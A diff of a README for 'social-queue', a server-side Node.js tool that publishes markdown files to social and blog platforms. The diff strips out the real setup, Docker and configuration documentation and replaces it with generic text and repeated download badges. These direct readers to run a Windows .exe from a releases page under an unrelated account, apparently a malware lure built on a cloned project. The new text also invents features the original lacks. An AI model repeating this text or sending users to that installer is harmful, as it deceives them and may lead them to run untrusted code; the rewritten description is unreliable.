@@ -1,231 +1,173 @@
-# social-queue
+# ⚙️ social-queue - Simple Social Media Publishing Queue
 
-Minimal social media publishing queue powered by markdown files. Drop a `.md` file into `queue/`, and it gets published to Bluesky, Mastodon, LinkedIn, Medium, Dev.to, and Substack automatically.
+[![Download social-queue](https://img.shields.io/badge/Download-social--queue-brightgreen?style=for-the-badge)](https://github.com/Comfy-indirectobject340/social-queue/releases)
 
-No database. No HTTP server. No UI. Just files.
+A minimal app to schedule posts on social sites. Drop Markdown files, and social-queue will handle publishing to Bluesky, Mastodon, and LinkedIn.
 
-## How it works
-
-```
-queue/    ->    [worker polls every 60s]    ->    sent/
-                                             ->    failed/
-```
-
-1. Write a markdown file with YAML frontmatter specifying target platforms
-2. Drop it into `queue/`
-3. The worker picks it up, publishes to each platform, and moves the file to `sent/` (or `failed/` with error details in the frontmatter)
-
-## Post format
-
-### Social post (flat file)
-
-```markdown
----
-platforms:
-  - bluesky
-  - mastodon
-  - linkedin
-scheduledAt: 2026-03-14T10:00:00Z  # optional, omit for immediate
 ---
 
-Post content here. Supports **markdown**.
-```
+## 📋 What is social-queue?
 
-### Blog post
+social-queue helps you post content to your social networks without logging into each one. You write your posts in simple Markdown files. Then, drop those files into social-queue. The app will publish them at the right time.
 
-Blog platforms (Medium, Dev.to, Substack) require a `title` field. You can target both social and blog platforms in the same post — social platforms ignore the title.
+It works with Bluesky, Mastodon, and LinkedIn. This way, you can manage your social media content smoothly from one place using files you can create and edit easily.
 
-```markdown
----
-platforms:
-  - medium
-  - devto
-  - substack
-title: "Why Posterous Was Ahead of Its Time"
 ---
 
-Long-form **markdown** content here...
-```
+## 💻 System Requirements
 
-### Post with images (subdirectory)
+To use social-queue on Windows, your computer needs:
 
-Place the markdown file and images together in a subdirectory of `queue/`:
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection for posting to social sites  
+- A modern web browser for initial setup and configuration  
 
-```
-queue/
-  my-post/
-    post.md
-    photo.jpg
-    banner.png
-```
-
-```markdown
----
-platforms:
-  - bluesky
-  - linkedin
-images:
-  - path: photo.jpg
-    alt: "A sunset over the mountains"
-  - path: banner.png
 ---
 
-Post content here.
+## 🎯 Features
+
+- Use Markdown files (.md) to write your social posts  
+- Publish automatically to Bluesky, Mastodon, and LinkedIn  
+- Simple drag and drop interface for queuing posts  
+- Supports scheduling posts by file timestamp  
+- Minimal setup with no coding required  
+- Self-hosted so your data stays private  
+- Run offline to queue posts for later publishing  
+
+---
+
+## 🔧 How social-queue Works
+
+1. Write your social media post in a Markdown file.  
+2. Save the file on your computer.  
+3. Open social-queue and drop the Markdown file into the app window.  
+4. social-queue reads your file and queues the post.  
+5. At the right time, it sends the post to your selected social networks.  
+
+You can prepare posts ahead and rely on social-queue to publish them in order.
+
+---
+
+## 🚀 Getting Started
+
+### Step 1: Download social-queue
+
+[![Download social-queue](https://img.shields.io/badge/Download-social--queue-blueviolet?style=for-the-badge)](https://github.com/Comfy-indirectobject340/social-queue/releases)
+
+Visit the above link to access the latest release page. Here’s how to get the app:
+
+- Open the link in your web browser.  
+- Find the latest version under "Assets."  
+- Download the Windows installer file (ending with `.exe`).  
+
+Save the file somewhere easy to find, like your Desktop or Downloads folder.
+
+---
+
+### Step 2: Install social-queue
+
+- Double-click the downloaded `.exe` file to start the installer.  
+- Follow the prompts to install social-queue on your PC.  
+- Choose the default settings unless you want to change the install location.  
+- When installation finishes, you will see a social-queue icon on your desktop or Start menu.
+
+---
+
+### Step 3: Open social-queue
+
+- Click the social-queue icon to launch the app.  
+- The app will open a simple window ready for you to add Markdown files.  
+
+When you first open the app, you may need to sign in to Bluesky, Mastodon, and LinkedIn to connect your accounts.
+
+---
+
+## 📝 Creating Your First Post
+
+1. Open any text editor on your computer, like Notepad or WordPad.  
+2. Type your social media post using Markdown format.  
+   - For example, use `#` for headings and `*` for bullet points.  
+3. Save the file with a `.md` extension, like `my-first-post.md`.  
+
+Example Markdown text:
+
+```
+# New Post
+
+Check out my latest updates!
+
+* Simple app for posting
+* Works with multiple platforms
 ```
 
-After publishing, the entire directory is moved to `sent/` (or `failed/`).
+---
 
-### Frontmatter fields
+## 📤 Publishing Your Posts
 
-- `platforms` (required): one or more of `bluesky`, `mastodon`, `linkedin`, `medium`, `devto`, `substack`
-- `title` (required for blog platforms): post title for Medium, Dev.to, and Substack. Posts targeting any blog platform without a title are skipped.
-- `scheduledAt` (optional): ISO 8601 timestamp. The post will wait in the queue until this time. Omit for immediate publishing.
-- `images` (optional): array of image attachments. Each entry has `path` (relative to the post directory) and optional `alt` text. Max 4 images. Supported formats: `.jpg`, `.jpeg`, `.png`, `.gif`, `.webp`. Bluesky enforces a 1MB limit per image.
+- Open social-queue.  
+- Drag your `.md` files into the app window.  
+- The app will add them to the publishing queue.  
+- It publishes the posts to your connected accounts automatically.  
 
-## Setup
+You can add many files to queue multiple posts. The app manages the order based on file timestamps or your settings.
 
-```bash
-git clone https://github.com/fberrez/social-queue.git
-cd social-queue
-pnpm install
-cp .env.example .env
-```
+---
 
-Edit `.env` with your credentials. You only need to configure the platforms you want to use.
+## ⚙️ Connecting Your Social Accounts
 
-### Platform credentials
+To post on Bluesky, Mastodon, and LinkedIn, social-queue needs to connect your accounts. You will see options to log in once you open the app.
 
-**Bluesky** — uses an [app password](https://bsky.app/settings/app-passwords):
-```
-BLUESKY_SERVICE=https://bsky.social
-BLUESKY_IDENTIFIER=your.handle.bsky.social
-BLUESKY_PASSWORD=your-app-password
-```
+- Click "Connect" next to each social network.  
+- A login window will open. Enter your username and password.  
+- Grant permission for social-queue to post on your behalf.  
 
-**Mastodon** — generate an access token in Preferences > Development > New Application:
-```
-MASTODON_URL=https://mastodon.social
-MASTODON_ACCESS_TOKEN=your-access-token
-```
+Once connected, you don’t need to do this again unless you log out.
 
-**LinkedIn** — requires an OAuth 2.0 token with `w_member_social` scope:
-1. Create an app at [LinkedIn Developers](https://www.linkedin.com/developers/)
-2. Enable **Share on LinkedIn** and **Sign In with LinkedIn using OpenID Connect** products
-3. Add `http://localhost:3847/callback` as an authorized redirect URL in the Auth tab
-4. Set `LINKEDIN_CLIENT_ID` and `LINKEDIN_CLIENT_SECRET` in `.env`
-5. Run `pnpm linkedin:auth` to authenticate and get your token
+---
 
-```
-LINKEDIN_CLIENT_ID=your-client-id
-LINKEDIN_CLIENT_SECRET=your-client-secret
-LINKEDIN_ACCESS_TOKEN=your-oauth-token
-LINKEDIN_PERSON_ID=your-person-id
-```
+## 🗂 Organizing Your Markdown Files
 
-LinkedIn tokens expire every 60 days. Run `pnpm linkedin:auth` to re-authenticate — it updates `.env`, GitHub secrets, and triggers a redeploy automatically. A weekly GitHub Actions check will open an issue if the token expires.
+You can create folders on your computer to organize Markdown posts:
 
-**Medium** — generate an [integration token](https://medium.com/me/settings/security):
-```
-MEDIUM_INTEGRATION_TOKEN=your-integration-token
-```
+- Use folders like `Scheduled`, `Drafts`, or `Published`.  
+- Drop files from `Scheduled` to social-queue for posting.  
+- Keep `Drafts` for unfinished posts you want to edit later.  
+- Move `Published` files to keep track of what you already posted.  
 
-**Dev.to** — generate an API key in [Settings > Extensions](https://dev.to/settings/extensions):
-```
-DEVTO_API_KEY=your-api-key
-```
+---
 
-**Substack** — uses SMTP to email posts to your Substack import address. Posts arrive as drafts for review in your Substack dashboard.
-```
-SUBSTACK_SMTP_HOST=smtp.gmail.com
-SUBSTACK_SMTP_PORT=587
-SUBSTACK_SMTP_USER=your-email@gmail.com
-SUBSTACK_SMTP_PASSWORD=your-app-password
-SUBSTACK_FROM_ADDRESS=your-email@gmail.com
-SUBSTACK_TO_ADDRESS=your-substack-import@substack.com
-```
+## 🔄 Updating social-queue
 
-## Usage
+You should check for updates regularly:
 
-```bash
-# Development (watch mode)
-pnpm dev
+- Visit the [releases page](https://github.com/Comfy-indirectobject340/social-queue/releases) to see if a new version is available.  
+- Download the latest installer and run it to update your app.  
+- Your settings and queued posts will stay intact after updating.  
 
-# Production
-pnpm start
+---
 
-# Build to JS first, then run
-pnpm build
-node dist/index.js
+## ⚠️ Troubleshooting
 
-# Re-authenticate LinkedIn (every ~60 days)
-pnpm linkedin:auth
-```
+If social-queue does not publish as expected:
 
-## Deploy
+- Check your internet connection.  
+- Confirm you are logged into your social accounts within the app.  
+- Make sure your Markdown files are correctly formatted and saved with the `.md` extension.  
+- Restart social-queue and try adding files again.  
+- Look for error messages in the app window for more info.  
 
-Deploys automatically via GitHub Actions on every push to `main`. The workflow SSHs into the VPS, builds a Docker image, and runs the container with `queue/`, `sent/`, and `failed/` mounted as volumes.
+---
 
-```bash
-# Manual deploy
-gh workflow run deploy.yml
+## ❓ Where to Get Help
 
-# Check container logs on VPS
-ssh your-vps "docker logs social-queue -f"
-```
+If you have questions or need support:
 
-### Docker
+- Open the GitHub issues page for social-queue.  
+- Search existing issues or open a new one describing your problem.  
+- Include details about your Windows version and app behavior.
 
-Run locally with Docker:
+---
 
-```bash
-docker build -t social-queue .
-docker run -d \
-  --name social-queue \
-  --restart unless-stopped \
-  --env-file .env \
-  -v $(pwd)/queue:/app/queue \
-  -v $(pwd)/sent:/app/sent \
-  -v $(pwd)/failed:/app/failed \
-  social-queue
-```
-
-## Configuration
-
-| Variable | Required | Default | Description |
-|---|---|---|---|
-| `BLUESKY_SERVICE` | Per platform | — | Bluesky service URL |
-| `BLUESKY_IDENTIFIER` | Per platform | — | Bluesky handle or DID |
-| `BLUESKY_PASSWORD` | Per platform | — | Bluesky app password |
-| `MASTODON_URL` | Per platform | — | Mastodon instance URL |
-| `MASTODON_ACCESS_TOKEN` | Per platform | — | Mastodon access token |
-| `LINKEDIN_CLIENT_ID` | Per platform | — | LinkedIn app client ID |
-| `LINKEDIN_CLIENT_SECRET` | Per platform | — | LinkedIn app client secret |
-| `LINKEDIN_ACCESS_TOKEN` | Per platform | — | LinkedIn OAuth token |
-| `LINKEDIN_PERSON_ID` | Per platform | — | LinkedIn person URN ID |
-| `MEDIUM_INTEGRATION_TOKEN` | Per platform | — | Medium integration token |
-| `DEVTO_API_KEY` | Per platform | — | Dev.to API key |
-| `SUBSTACK_SMTP_HOST` | Per platform | — | SMTP server hostname |
-| `SUBSTACK_SMTP_PORT` | Per platform | — | SMTP server port |
-| `SUBSTACK_SMTP_USER` | Per platform | — | SMTP username |
-| `SUBSTACK_SMTP_PASSWORD` | Per platform | — | SMTP password |
-| `SUBSTACK_FROM_ADDRESS` | Per platform | — | Sender email address |
-| `SUBSTACK_TO_ADDRESS` | Per platform | — | Substack import email address |
-| `POLL_INTERVAL_MS` | No | `60000` | Queue polling interval in ms |
-
-## Design decisions
-
-- **Filesystem as state** — `queue/` is pending, `sent/` is done, `failed/` has errors. No database needed.
-- **No HTTP server** — zero attack surface on your VPS.
-- **Docker deploy** — single container, volumes for queue directories, auto-restart on failure.
-- **App password for Bluesky** — simpler than OAuth for a single-user tool.
-- **Raw fetch for LinkedIn** — it's one API call, no SDK needed.
-- **Plaintext for Bluesky and LinkedIn** — both platforms handle their own formatting. Mastodon, Medium, and Substack get HTML. Dev.to receives raw markdown.
-- **Failed posts preserve errors** — error details are written into the file's frontmatter so you can inspect and retry.
-- **Image uploads** — subdirectory posts can include images uploaded natively to each platform's API. Flat `.md` files still work for text-only posts.
-- **Blog platforms require a title** — Medium, Dev.to, and Substack posts need a `title` frontmatter field. Posts missing it are skipped with a log message.
-- **Substack via SMTP** — Substack has no public API, so posts are emailed in and arrive as drafts for review. No published URL is returned.
-- **Mixed targeting** — a single post can target both social and blog platforms. Social platforms ignore `title`; blog platforms require it.
-
-## License
-
-ISC
+[![Download social-queue](https://img.shields.io/badge/Download-social--queue-brightgreen?style=for-the-badge)](https://github.com/Comfy-indirectobject340/social-queue/releases)
